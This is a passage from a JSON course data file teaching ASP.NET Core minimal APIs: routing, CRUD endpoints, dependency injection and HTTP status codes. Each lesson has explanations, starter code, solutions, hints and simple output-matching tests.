              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Route order matters**: /api/todos/completed MUST come BEFORE /api/todos/{id}! Otherwise {id} matches 'completed' as a string ID. Specific routes before parameterized ones!\n\n**TypedResults vs Results**: Both work, but TypedResults provides compile-time checking and automatic OpenAPI documentation. Use TypedResults in .NET 7+!\n\n**Results<T1, T2> return type**: When using TypedResults with multiple possible returns, declare the union type explicitly: Results<Ok<Todo>, NotFound>. This enables full OpenAPI support.\n\n**Null checks with FirstOrDefault**: Always check for null! FirstOrDefault returns null if not found. Accessing properties on null = NullReferenceException crash!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-11-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a Book Library API!\n\n1. Create a 'Book' class:\n   - int Id\n   - string Title\n   - string Author\n   - int Year\n   - bool IsAvailable\n\n2. Create in-memory List with 4-5 books\n\n3. Create these endpoints:\n   - GET /api/books -> Return all books\n   - GET /api/books/{id} -> Return single book (use Results.Ok or Results.NotFound)\n   - GET /api/books/available -> Return only available books\n   - GET /api/books/author/{author} -> Return books by specific author\n   - GET /api/books/stats -> Return statistics (total books, available, unavailable)\n\n4. Print endpoint list when API starts",
              "starterCode": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass Book\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public string Author { get; set; }\n    public int Year { get; set; }\n    public bool IsAvailable { get; set; }\n}\n\nvar books = new List<Book>\n{\n    // Add 4-5 books\n};\n\n// GET all books\napp.MapGet(\"/api/books\", () => books);\n\n// GET book by ID\napp.MapGet(\"/api/books/{id}\", (int id) =>\n{\n    // Find and return book or NotFound\n});\n\n// GET available books\napp.MapGet(\"/api/books/available\", () =>\n{\n    // Filter available books\n});\n\n// GET books by author\napp.MapGet(\"/api/books/author/{author}\", (string author) =>\n{\n    // Filter by author\n});\n\n// GET statistics\napp.MapGet(\"/api/books/stats\", () =>\n{\n    // Return stats object\n});\n\nConsole.WriteLine(\"Book Library API Ready!\");",
              "solution": "using Microsoft.AspNetCore.Builder;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass Book\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public string Author { get; set; }\n    public int Year { get; set; }\n    public bool IsAvailable { get; set; }\n}\n\nvar books = new List<Book>\n{\n    new Book { Id = 1, Title = \"1984\", Author = \"Orwell\", Year = 1949, IsAvailable = true },\n    new Book { Id = 2, Title = \"To Kill a Mockingbird\", Author = \"Lee\", Year = 1960, IsAvailable = false },\n    new Book { Id = 3, Title = \"Animal Farm\", Author = \"Orwell\", Year = 1945, IsAvailable = true },\n    new Book { Id = 4, Title = \"The Great Gatsby\", Author = \"Fitzgerald\", Year = 1925, IsAvailable = true }\n};\n\napp.MapGet(\"/api/books\", () => books);\n\napp.MapGet(\"/api/books/{id}\", (int id) =>\n{\n    var book = books.FirstOrDefault(b => b.Id == id);\n    return book is not null ? Results.Ok(book) : Results.NotFound();\n});\n\napp.MapGet(\"/api/books/available\", () =>\n{\n    return books.Where(b => b.IsAvailable);\n});\n\napp.MapGet(\"/api/books/author/{author}\", (string author) =>\n{\n    return books.Where(b => b.Author.Equals(author, StringComparison.OrdinalIgnoreCase));\n});\n\napp.MapGet(\"/api/books/stats\", () =>\n{\n    return new \n    { \n        Total = books.Count, \n        Available = books.Count(b => b.IsAvailable),\n        Unavailable = books.Count(b => !b.IsAvailable)\n    };\n});\n\nConsole.WriteLine(\"Book Library API Ready!\");\nConsole.WriteLine(\"Endpoints:\");\nConsole.WriteLine(\"  GET /api/books\");\nConsole.WriteLine(\"  GET /api/books/{id}\");\nConsole.WriteLine(\"  GET /api/books/available\");\nConsole.WriteLine(\"  GET /api/books/author/{author}\");\nConsole.WriteLine(\"  GET /api/books/stats\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Book Library\"",
                  "expectedOutput": "Book Library",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Ready\"",
                  "expectedOutput": "Ready",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Endpoints\"",
                  "expectedOutput": "Endpoints",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Class inside Program.cs: 'class Book { properties }'. List: 'new List<Book> { new Book { ... } }'. Find: '.FirstOrDefault()'. Filter: '.Where()'. Return: 'Results.Ok()' or 'Results.NotFound()'."
                },
                {
                  "level": 2,
                  "text": "Route order matters: /api/books/available MUST come BEFORE /api/books/{id}! Otherwise {id} matches \\\"available\\\" as ID. Specific routes before parameterized ones!"
                },
                {
                  "level": 3,
                  "text": "Case sensitivity in string compare: author == \\\"Orwell\\\" won't match \\\"orwell\\\"! Use .Equals(author, StringComparison.OrdinalIgnoreCase) for case-insensitive matching."
                },
                {
                  "level": 4,
                  "text": "Null reference on FirstOrDefault: Always check 'is not null' before using! FirstOrDefault returns null if not found. Accessing properties on null = NullReferenceException."
                },
                {
                  "level": 5,
                  "text": "Forgetting to return Results: Just returning 'null' gives 204 No Content! Use 'Results.NotFound()' for proper 404 status. HTTP status codes matter for API consumers!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Route order matters",
                  "consequence": "/api/books/available MUST come BEFORE /api/books/{id}! Otherwise {id} matches \\\"available\\\" as ID. Specific routes before parameterized ones!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Case sensitivity in string compare",
                  "consequence": "author == \\\"Orwell\\\" won't match \\\"orwell\\\"! Use .Equals(author, StringComparison.OrdinalIgnoreCase) for case-insensitive matching.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Null reference on FirstOrDefault",
                  "consequence": "Always check 'is not null' before using! FirstOrDefault returns null if not found. Accessing properties on null = NullReferenceException.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to return Results",
                  "consequence": "Just returning 'null' gives 204 No Content! Use 'Results.NotFound()' for proper 404 status. HTTP status codes matter for API consumers!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-11-03",
          "title": "Routing (MapGet, MapPost, MapPut, MapDelete)",
          "moduleId": "module-11",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a file cabinet with different actions:\n• READ a file (GET) - Just look, don't change\n• CREATE new file (POST) - Add new document\n• UPDATE existing file (PUT) - Replace entire file\n• DELETE file (DELETE) - Remove it\n\nThese are HTTP METHODS (or VERBS)! Each has a purpose:\n\nGET = Read data (no changes)\nPOST = Create new resource\nPUT = Update existing resource (full update)\nDELETE = Remove resource\nPATCH = Partial update (advanced)\n\nREST API pattern:\n• GET /api/products - List all\n• GET /api/products/5 - Get one\n• POST /api/products - Create new\n• PUT /api/products/5 - Update\n• DELETE /api/products/5 - Delete\n\nASP.NET Core mapping:\n• app.MapGet() - GET requests\n• app.MapPost() - POST requests\n• app.MapPut() - PUT requests\n• app.MapDelete() - DELETE requests\n\nThink: Different HTTP methods = Different actions on same resource!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass Product\n{\n    public int Id { get; set; }\n    public string? Name { get; set; }\n    public decimal Price { get; set; }\n}\n\nvar products = new List<Product>\n{\n    new Product { Id = 1, Name = \"Laptop\", Price = 999.99m },\n    new Product { Id = 2, Name = \"Mouse\", Price = 29.99m }\n};\n\nint nextId = 3;\n\n// GET - Read all\napp.MapGet(\"/api/products\", () => products);\n\n// GET - Read one\napp.MapGet(\"/api/products/{id}\", (int id) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    return product is not null ? Results.Ok(product) : Results.NotFound();\n});\n\n// POST - Create new\napp.MapPost(\"/api/products\", (Product product) =>\n{\n    product.Id = nextId++;\n    products.Add(product);\n    return Results.Created($\"/api/products/{product.Id}\", product);\n});\n\n// PUT - Update existing\napp.MapPut(\"/api/products/{id}\", (int id, Product updatedProduct) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    if (product is null) return Results.NotFound();\n    \n    product.Name = updatedProduct.Name;\n    product.Price = updatedProduct.Price;\n    return Results.Ok(product);\n});\n\n// DELETE - Remove\napp.MapDelete(\"/api/products/{id}\", (int id) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    if (product is null) return Results.NotFound();\n    \n    products.Remove(product);\n    return Results.NoContent();\n});\n\napp.Run();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`app.MapPost(route, handler)`**: Handles POST requests (create). Handler receives request body as parameter. ASP.NET Core auto-deserializes JSON to object!\n\n**`TypedResults.Created(location, value)`**: Returns 201 Created with strongly-typed response. First param is URL of new resource. Second is the created object. Standard for POST!\n\n**`app.MapPut(route, handler)`**: Handles PUT requests (update). Typically receives ID in route and updated object in body: (int id, Product product) => ...\n\n**`TypedResults.NoContent()`**: Returns 204 No Content. Common for DELETE - operation succeeded but no data to return. TypedResults version for better OpenAPI docs!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Not assigning ID in POST**: Server assigns IDs, not client! Use 'item.Id = nextId++' before adding. Letting clients set IDs is a security risk!\n\n**Modifying wrong object in PUT**: Don't modify the 'updatedItem' parameter! Find the existing item in the list, then update ITS properties. Otherwise changes aren't persisted!\n\n**Forgetting to actually remove in DELETE**: Calling Results.NoContent() doesn't delete anything! Must call 'list.Remove(item)' first, THEN return NoContent.\n\n**PUT vs PATCH confusion**: PUT replaces the ENTIRE resource (all fields). PATCH updates only specified fields. Most APIs use PUT for simplicity."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-11-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a complete CRUD API for Tasks!\n\n1. Create 'TaskItem' class:\n   - int Id\n   - string Title\n   - string Description\n   - bool IsCompleted\n\n2. Create in-memory list with 2 initial tasks\n\n3. Implement ALL CRUD operations:\n   - GET /api/tasks - Return all tasks\n   - GET /api/tasks/{id} - Return single task\n   - POST /api/tasks - Create new task (auto-assign ID)\n   - PUT /api/tasks/{id} - Update task\n   - DELETE /api/tasks/{id} - Delete task\n\n4. For POST: use nextId counter for auto-incrementing IDs\n\n5. Print available endpoints when API starts",
              "starterCode": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass TaskItem\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public string Description { get; set; }\n    public bool IsCompleted { get; set; }\n}\n\nvar tasks = new List<TaskItem>\n{\n    new TaskItem { Id = 1, Title = \"Learn ASP.NET\", Description = \"Study web APIs\", IsCompleted = false },\n    new TaskItem { Id = 2, Title = \"Build project\", Description = \"Create todo API\", IsCompleted = false }\n};\n\nint nextId = 3;\n\n// GET all\napp.MapGet(\"/api/tasks\", () => tasks);\n\n// GET by ID\napp.MapGet(\"/api/tasks/{id}\", (int id) =>\n{\n    // Find and return task or NotFound\n});\n\n// POST - Create\napp.MapPost(\"/api/tasks\", (TaskItem task) =>\n{\n    // Assign ID, add to list, return Created\n});\n\n// PUT - Update\napp.MapPut(\"/api/tasks/{id}\", (int id, TaskItem updatedTask) =>\n{\n    // Find, update properties, return Ok or NotFound\n});\n\n// DELETE\napp.MapDelete(\"/api/tasks/{id}\", (int id) =>\n{\n    // Find, remove, return NoContent or NotFound\n});\n\nConsole.WriteLine(\"Task API Ready!\");",
              "solution": "using Microsoft.AspNetCore.Builder;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass TaskItem\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public string Description { get; set; }\n    public bool IsCompleted { get; set; }\n}\n\nvar tasks = new List<TaskItem>\n{\n    new TaskItem { Id = 1, Title = \"Learn ASP.NET\", Description = \"Study web APIs\", IsCompleted = false },\n    new TaskItem { Id = 2, Title = \"Build project\", Description = \"Create todo API\", IsCompleted = false }\n};\n\nint nextId = 3;\n\napp.MapGet(\"/api/tasks\", () => tasks);\n\napp.MapGet(\"/api/tasks/{id}\", (int id) =>\n{\n    var task = tasks.FirstOrDefault(t => t.Id == id);\n    return task is not null ? Results.Ok(task) : Results.NotFound();\n});\n\napp.MapPost(\"/api/tasks\", (TaskItem task) =>\n{\n    task.Id = nextId++;\n    tasks.Add(task);\n    return Results.Created($\"/api/tasks/{task.Id}\", task);\n});\n\napp.MapPut(\"/api/tasks/{id}\", (int id, TaskItem updatedTask) =>\n{\n    var task = tasks.FirstOrDefault(t => t.Id == id);\n    if (task is null) return Results.NotFound();\n    \n    task.Title = updatedTask.Title;\n    task.Description = updatedTask.Description;\n    task.IsCompleted = updatedTask.IsCompleted;\n    return Results.Ok(task);\n});\n\napp.MapDelete(\"/api/tasks/{id}\", (int id) =>\n{\n    var task = tasks.FirstOrDefault(t => t.Id == id);\n    if (task is null) return Results.NotFound();\n    \n    tasks.Remove(task);\n    return Results.NoContent();\n});\n\nConsole.WriteLine(\"Task API Ready!\");\nConsole.WriteLine(\"CRUD Endpoints:\");\nConsole.WriteLine(\"  GET    /api/tasks\");\nConsole.WriteLine(\"  GET    /api/tasks/{id}\");\nConsole.WriteLine(\"  POST   /api/tasks\");\nConsole.WriteLine(\"  PUT    /api/tasks/{id}\");\nConsole.WriteLine(\"  DELETE /api/tasks/{id}\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Task API\"",
                  "expectedOutput": "Task API",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"CRUD Endpoints\"",
                  "expectedOutput": "CRUD Endpoints",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"POST\"",
                  "expectedOutput": "POST",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"PUT\"",
                  "expectedOutput": "PUT",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"DELETE\"",
                  "expectedOutput": "DELETE",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "MapPost: 'app.MapPost(route, (Object obj) => ...)'. Assign ID before adding! MapPut: update properties one by one. MapDelete: .Remove() from list. Return proper Results: Created, Ok, NoContent, NotFound."
                },
                {
                  "level": 2,
                  "text": "Not assigning ID in POST: Client shouldn't provide ID for new items! Server assigns it: 'task.Id = nextId++'. Then add to list. ID assignment is server's job!"
                },
                {
                  "level": 3,
                  "text": "Modifying wrong object in PUT: Don't modify 'updatedTask' parameter! Find existing item in list, then update ITS properties. Otherwise changes aren't persisted."
                },
                {
                  "level": 4,
                  "text": "Forgetting to remove in DELETE: Must call 'list.Remove(item)'! Just returning NoContent() doesn't delete it. Actually remove from collection!"
                },
                {
                  "level": 5,
                  "text": "Using same route for different methods: Same route with different methods is FINE! GET /api/tasks and POST /api/tasks are different endpoints. Method matters, not just URL!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not assigning ID in POST",
                  "consequence": "Client shouldn't provide ID for new items! Server assigns it: 'task.Id = nextId++'. Then add to list. ID assignment is server's job!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Modifying wrong object in PUT",
                  "consequence": "Don't modify 'updatedTask' parameter! Find existing item in list, then update ITS properties. Otherwise changes aren't persisted.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to remove in DELETE",
                  "consequence": "Must call 'list.Remove(item)'! Just returning NoContent() doesn't delete it. Actually remove from collection!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using same route for different methods",
                  "consequence": "Same route with different methods is FINE! GET /api/tasks and POST /api/tasks are different endpoints. Method matters, not just URL!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-11-04",
          "title": "Dependency Injection (The Supply Manager)",
          "moduleId": "module-11",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a chef in a restaurant:\n\nBAD WAY (creating dependencies yourself):\n• Chef grows vegetables\n• Chef raises chickens\n• Chef makes plates\n• Chef builds oven\n• THEN cooks!\n\nGOOD WAY (dependencies provided):\n• Kitchen manager PROVIDES ingredients\n• Kitchen manager PROVIDES tools\n• Chef just COOKS!\n\nThat's DEPENDENCY INJECTION (DI)!\n\nDependency = Something your code needs to work (database, logger, email service)\n\nInstead of creating dependencies yourself:\n• You DECLARE what you need (interface or class type)\n• ASP.NET Core PROVIDES it (injects it)\n• You just USE it!\n\nBenefits:\n• TESTABLE - Swap real database for fake one in tests\n• FLEXIBLE - Change implementations easily\n• CLEAN - No 'new' everywhere!\n\nThink: DI = 'Don't create what you need. Ask for it, and it will be provided!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// STEP 1: Define interface (contract)\ninterface IProductRepository\n{\n    List<Product> GetAll();\n    Product? GetById(int id);\n    void Add(Product product);\n}\n\n// STEP 2: Implement interface\nclass ProductRepository : IProductRepository\n{\n    private readonly List<Product> _products = new()\n    {\n        new Product { Id = 1, Name = \"Laptop\", Price = 999.99m },\n        new Product { Id = 2, Name = \"Mouse\", Price = 29.99m }\n    };\n    \n    public List<Product> GetAll() => _products;\n    public Product? GetById(int id) => _products.FirstOrDefault(p => p.Id == id);\n    public void Add(Product product) => _products.Add(product);\n}\n\nclass Product\n{\n    public int Id { get; set; }\n    public string? Name { get; set; }\n    public decimal Price { get; set; }\n}\n\n// STEP 3: Register service with DI container\nbuilder.Services.AddSingleton<IProductRepository, ProductRepository>();\n\nvar app = builder.Build();\n\n// STEP 4: Inject into endpoint handlers\napp.MapGet(\"/api/products\", (IProductRepository repo) =>\n{\n    return repo.GetAll();  // DI provides the repo!\n});\n\napp.MapGet(\"/api/products/{id}\", (int id, IProductRepository repo) =>\n{\n    var product = repo.GetById(id);\n    return product is not null ? Results.Ok(product) : Results.NotFound();\n});\n\napp.MapPost(\"/api/products\", (Product product, IProductRepository repo) =>\n{\n    repo.Add(product);\n    return Results.Created($\"/api/products/{product.Id}\", product);\n});\n\napp.Run();\n\n// DI automatically provides IProductRepository to ALL endpoints!\n// Same instance shared across all requests (Singleton lifetime)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`builder.Services.AddSingleton<I, T>()`**: Registers service with DI. ONE instance created, shared by ALL requests. Use for stateless services. <Interface, Implementation> pattern.\n\n**`builder.Services.AddScoped<I, T>()`**: NEW instance per HTTP request. Shared within single request. Use for database contexts. Disposed after request ends.\n\n**`builder.Services.AddTransient<I, T>()`**: NEW instance EVERY TIME requested. Use for lightweight, stateless services. Most isolated but potentially more overhead.\n\n**`Keyed Services (.NET 8+)`**: Multiple implementations of same interface! Register: 'AddKeyedSingleton<IService, ImplA>(\"keyA\")'. Inject: '([FromKeyedServices(\"keyA\")] IService service)'. Perfect for strategy pattern!\n\n**`Injecting into handlers`**: Add service as parameter to handler: (IService service) => ... ASP.NET Core automatically provides it! Can mix with route/query params."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Captive Dependency (CRITICAL!)**: Injecting Scoped into Singleton = disaster! The Scoped service becomes effectively Singleton, causing stale data and threading bugs. Use IServiceScopeFactory if you need Scoped from Singleton.\n\n**Registering AFTER Build()**: Services must be registered BEFORE 'builder.Build()'! After Build(), it's too late. You'll get runtime errors.\n\n**Injecting implementation instead of interface**: Use '(IRepository repo)' not '(Repository repo)'. Interface enables testing with mocks and swapping implementations!\n\n**Forgetting to register**: If you inject IService but forgot to register it, you get: 'Unable to resolve service for type IService'. Always register before using!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-11-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a TODO API with Dependency Injection!\n\n1. Create 'TodoItem' class (Id, Title, IsCompleted)\n\n2. Create 'ITodoRepository' interface:\n   - List<TodoItem> GetAll()\n   - TodoItem? GetById(int id)\n   - void Add(TodoItem item)\n   - void Update(int id, TodoItem item)\n   - void Delete(int id)\n\n3. Create 'TodoRepository' class implementing ITodoRepository:\n   - Use in-memory List<TodoItem>\n   - Implement all methods\n\n4. Register with DI: builder.Services.AddSingleton<ITodoRepository, TodoRepository>()\n\n5. Create endpoints that inject ITodoRepository:\n   - GET /api/todos\n   - GET /api/todos/{id}\n   - POST /api/todos\n   - PUT /api/todos/{id}\n   - DELETE /api/todos/{id}\n\n6. Print \"DI-based Todo API Ready!\"",
              "starterCode": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nclass TodoItem\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public bool IsCompleted { get; set; }\n}\n\ninterface ITodoRepository\n{\n    // Define methods\n}\n\nclass TodoRepository : ITodoRepository\n{\n    private readonly List<TodoItem> _todos = new()\n    {\n        new TodoItem { Id = 1, Title = \"Learn DI\", IsCompleted = false }\n    };\n    private int _nextId = 2;\n    \n    // Implement interface methods\n}\n\n// Register with DI\nbuilder.Services.AddSingleton<ITodoRepository, TodoRepository>();\n\nvar app = builder.Build();\n\n// Create endpoints with DI injection\napp.MapGet(\"/api/todos\", (ITodoRepository repo) =>\n{\n    // Use repo\n});\n\n// Implement other endpoints...\n\nConsole.WriteLine(\"DI-based Todo API Ready!\");",
              "solution": "using Microsoft.AspNetCore.Builder;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nclass TodoItem\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public bool IsCompleted { get; set; }\n}\n\ninterface ITodoRepository\n{\n    List<TodoItem> GetAll();\n    TodoItem? GetById(int id);\n    void Add(TodoItem item);\n    void Update(int id, TodoItem item);\n    void Delete(int id);\n}\n\nclass TodoRepository : ITodoRepository\n{\n    private readonly List<TodoItem> _todos = new()\n    {\n        new TodoItem { Id = 1, Title = \"Learn DI\", IsCompleted = false }\n    };\n    private int _nextId = 2;\n    \n    public List<TodoItem> GetAll() => _todos;\n    \n    public TodoItem? GetById(int id) => _todos.FirstOrDefault(t => t.Id == id);\n    \n    public void Add(TodoItem item)\n    {\n        item.Id = _nextId++;\n        _todos.Add(item);\n    }\n    \n    public void Update(int id, TodoItem item)\n    {\n        var todo = GetById(id);\n        if (todo is not null)\n        {\n            todo.Title = item.Title;\n            todo.IsCompleted = item.IsCompleted;\n        }\n    }\n    \n    public void Delete(int id)\n    {\n        var todo = GetById(id);\n        if (todo is not null) _todos.Remove(todo);\n    }\n}\n\nbuilder.Services.AddSingleton<ITodoRepository, TodoRepository>();\n\nvar app = builder.Build();\n\napp.MapGet(\"/api/todos\", (ITodoRepository repo) => repo.GetAll());\n\napp.MapGet(\"/api/todos/{id}\", (int id, ITodoRepository repo) =>\n{\n    var todo = repo.GetById(id);\n    return todo is not null ? Results.Ok(todo) : Results.NotFound();\n});\n\napp.MapPost(\"/api/todos\", (TodoItem item, ITodoRepository repo) =>\n{\n    repo.Add(item);\n    return Results.Created($\"/api/todos/{item.Id}\", item);\n});\n\napp.MapPut(\"/api/todos/{id}\", (int id, TodoItem item, ITodoRepository repo) =>\n{\n    var existing = repo.GetById(id);\n    if (existing is null) return Results.NotFound();\n    repo.Update(id, item);\n    return Results.Ok(existing);\n});\n\napp.MapDelete(\"/api/todos/{id}\", (int id, ITodoRepository repo) =>\n{\n    var existing = repo.GetById(id);\n    if (existing is null) return Results.NotFound();\n    repo.Delete(id);\n    return Results.NoContent();\n});\n\nConsole.WriteLine(\"DI-based Todo API Ready!\");\nConsole.WriteLine(\"Using Dependency Injection for clean architecture!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"DI-based\"",
                  "expectedOutput": "DI-based",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Todo API\"",
                  "expectedOutput": "Todo API",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Ready\"",
                  "expectedOutput": "Ready",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Define interface with methods. Implement in class. Register: 'builder.Services.AddSingleton<IInterface, Implementation>()'. Inject: add as parameter '(IInterface service) => ...'."
                },
                {
                  "level": 2,
                  "text": "Registering after builder.Build(): Must register services BEFORE 'var app = builder.Build()'! After Build(), it's too late. Services go in 'builder.Services', not 'app'."
                },
                {
                  "level": 3,
                  "text": "Using implementation type in endpoints: Inject INTERFACE, not implementation! Use '(IRepository repo)' not '(Repository repo)'. Interface = flexibility!"
                },
                {
                  "level": 4,
                  "text": "Wrong lifetime choice: Singleton = one instance forever (careful with state!). Scoped = per request (good for DB contexts). Transient = every time (safe but overhead)."
                },
                {
                  "level": 5,
                  "text": "Forgetting to register: If you inject IService but didn't register it, you get runtime error: 'Unable to resolve service'. Must register in builder.Services first!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Registering after builder.Build()",
                  "consequence": "Must register services BEFORE 'var app = builder.Build()'! After Build(), it's too late. Services go in 'builder.Services', not 'app'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using implementation type in endpoints",
                  "consequence": "Inject INTERFACE, not implementation! Use '(IRepository repo)' not '(Repository repo)'. Interface = flexibility!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong lifetime choice",
                  "consequence": "Singleton = one instance forever (careful with state!). Scoped = per request (good for DB contexts). Transient = every time (safe but overhead).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to register",
                  "consequence": "If you inject IService but didn't register it, you get runtime error: 'Unable to resolve service'. Must register in builder.Services first!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Captive Dependencies (CRITICAL!)",
                  "consequence": "Injecting a Scoped service into a Singleton creates a 'captive dependency' - the Scoped service becomes effectively Singleton! Example: If DbContext (Scoped) is injected into a Singleton service, the SAME DbContext instance is reused across ALL requests, causing data corruption, stale data, and threading issues!",
                  "correction": "Never inject Scoped services into Singletons! Either: (1) Make both Scoped, (2) Inject IServiceScopeFactory into Singleton and create scope manually, or (3) Use AddDbContextFactory instead of AddDbContext."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-11-05",
          "title": "Returning Data & Status Codes (Speaking HTTP)",
          "moduleId": "module-11",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine calling a restaurant:\n\nYou: \"Do you have a table for 4?\"\n\nGOOD responses:\n✅ \"Yes, table 12 is ready!\" (200 OK with data)\n✅ \"Sorry, we're fully booked\" (404 Not Found)\n✅ \"Invalid number, we don't have table for -1 people!\" (400 Bad Request)\n\nBAD response:\n❌ \"Umm... maybe? I dunno\" (Unclear status)\n\nHTTP STATUS CODES are how APIs communicate results:\n\n2xx SUCCESS:\n• 200 OK - Request succeeded, here's data\n• 201 Created - New resource created\n• 204 No Content - Success, but no data to return\n\n4xx CLIENT ERROR (user's fault):\n• 400 Bad Request - Invalid input\n• 404 Not Found - Resource doesn't exist\n• 401 Unauthorized - Need to log in\n\n5xx SERVER ERROR (our fault):\n• 500 Internal Server Error - Something broke\n\nThink: Status codes = 'The universal language of HTTP. Speak it correctly!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
